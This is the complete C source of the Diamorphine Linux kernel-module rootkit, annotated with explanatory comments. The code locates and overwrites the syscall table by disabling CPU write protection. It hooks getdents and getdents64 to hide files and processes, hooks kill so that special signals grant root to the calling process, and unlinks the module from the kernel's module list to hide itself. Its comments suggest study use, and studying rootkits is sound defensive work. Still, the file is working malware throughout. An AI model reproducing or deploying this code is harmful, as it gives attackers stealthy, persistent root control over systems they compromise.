#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
	#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
	#include <linux/proc_ns.h>
#else
	#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
	#include <linux/file.h>
#else
	#include <linux/fdtable.h>
#endif

#include "diamorphine.h"

unsigned long cr0;
static unsigned long *__sys_call_table;
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
	unsigned int);
typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
	struct linux_dirent64 *, unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;

// Dynamically search for the syscall table location in memory.
unsigned long *
get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
	unsigned long int i;

    // Iterates over memory searching for the syscall table address. To find
    // the table this uses some basic pattern matching and compares the
    // contents of memory at i plus the offset __NR_close (close() syscall)
    // would be with the contents of the actual close() syscall.
    // The close() syscall is chosen instead of others because it has the same
    // offset on x86 and x86_64 architectures.
	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

// Search for a process with specified PID by iterating over the task_struct
// list.
struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

// Malicious implementation of getdents64(), syscall responsible for listing
// subdirectories and files. This is used for hiding directories.
asmlinkage int
hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count), err; 
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

// The current pointer refers to the user process currently executing. During
// the execution of a system call, such as open or read, the current process is
// the one that invoked the call. The pointer is defined in arch/x86/include/current.h:
//
// static __always_inline struct task_struct *get_current(void)
// {
//     return percpu_read_stable(current_task);
// }
// #define current get_current()
//
// In short, it's a task_struct for the process that called the syscall, which
// is getdent() in this case. In turn task_struct is a massive struct[1] that
// holds all sorts of info about a task including a list of all files it has open.
// As such, d_inode is the inode struct from the file descriptor passed as parameter
// to the syscall.
// [1] https://elixir.bootlin.com/linux/v4.6/source/include/linux/sched.h#L1394
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
    // This seem to check wether the inode is /proc. This is necessary
    // to hide the /proc/$PID entries for our hidden PIDs.
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

    // Iterates over all directories from real getdents().
	while (off < ret) {
		dir = (void *)kdirent + off;
        // When not in /proc filesystem check if dir/file name starts with MAGIC_PREFIX.
        // When in /proc filesystem check if the PID (like /proc/125) is marked as invisible.
		if ((!proc &&
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
            // If dir is the first element of the dirent list, discard it.
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
            // Otherwise increment the length of the previous record such that
            // prev + prev->d_reclen = next.
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

asmlinkage int
hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

// Gives root to the current task. Inner working is pretty straight forward: simply
// modify the task attributes.
void
give_root(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
	#else
        // Newer kernels use a cred struct to store permissions of a task.
        // Moreover CONFIG_UIDGID_STRICT_TYPE_CHECKS makes the {uid,euid,suid,fsuid}
        // structs, so assigning integers to those will result in a build
        // failure (since integers can't be assigned to structs).
		struct cred *newcreds;
		newcreds = prepare_creds();
		if (newcreds == NULL)
			return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			newcreds->uid.val = newcreds->gid.val = 0;
			newcreds->euid.val = newcreds->egid.val = 0;
			newcreds->suid.val = newcreds->sgid.val = 0;
			newcreds->fsuid.val = newcreds->fsgid.val = 0;
		#else
			newcreds->uid = newcreds->gid = 0;
			newcreds->euid = newcreds->egid = 0;
			newcreds->suid = newcreds->sgid = 0;
			newcreds->fsuid = newcreds->fsgid = 0;
		#endif
        // Finally commit the modified credentials. Curiously commit_creds seem
        // to call kdebug(), so this might get logged into the ringbuffer.
		commit_creds(newcreds);
	#endif
}

static inline void
tidy(void)
{
//	kfree(THIS_MODULE->notes_attrs);
//	THIS_MODULE->notes_attrs = NULL;
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
//	kfree(THIS_MODULE->mkobj.mp);
//	THIS_MODULE->mkobj.mp = NULL;
//	THIS_MODULE->modinfo_attrs->attr.name = NULL;
//	kfree(THIS_MODULE->mkobj.drivers_dir);
//	THIS_MODULE->mkobj.drivers_dir = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;

// This will unhide the module by adding the rootkit module (previously
// assigned to module_previous) to linked list of modules that's maintained by
// the kernel.
void
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
	//			MODULE_NAME);
	module_hidden = 0;
}

// Much like the previous function this will remove the rootkit module
// from the linked list of modules.
void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);
	//list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = 1;
}

// Malicious version of kill() syscall.
asmlinkage int
hacked_kill(pid_t pid, int sig)
{
	struct task_struct *task;

	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
            // Set task flag to make it invisible. This flag is checked by the
            // getdents() syscall when reading entries in /proc.
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
            // Makes the task that called kill() root.
			give_root();
			break;
		case SIGMODINVIS:
            // Toggles the module visibility.
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
            // Calls original kill().
			return orig_kill(pid, sig);
	}
	return 0;
}

// This restores the Control Register 0 to its original value.
static inline void
protect_memory(void)
{
	write_cr0(cr0);
}

// This unsets a bit in the Control Register 0. This disables the CPU write
// protection, making the module able to write to a read-only memory location
// such as the syscall table.
//
// The CR0 register is a special register that is responsible for a controlling
// the behaviour of the CPU. This register's contents cannot be accessed from
// userland so the Kernel provides the functions read_cr0() and write_cr0()
// that to read and write to it.
static inline void
unprotect_memory(void)
{
	write_cr0(cr0 & ~0x00010000);
}

// This is the function that gets called when the module is loaded.
static int __init
diamorphine_init(void)
{
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;

    // Store original contents of CR0.
	cr0 = read_cr0();

	module_hide();
	tidy();

    // Save original syscalls
	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];

    // Remove write protection from memory, modify syscall_table with malicious
    // functions and adds write protection back.
	unprotect_memory();
	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
	protect_memory();

	return 0;
}

static void __exit
diamorphine_cleanup(void)
{
    // Restore syscall table to original condition.
	unprotect_memory();
	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	protect_memory();
}

module_init(diamorphine_init);
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");
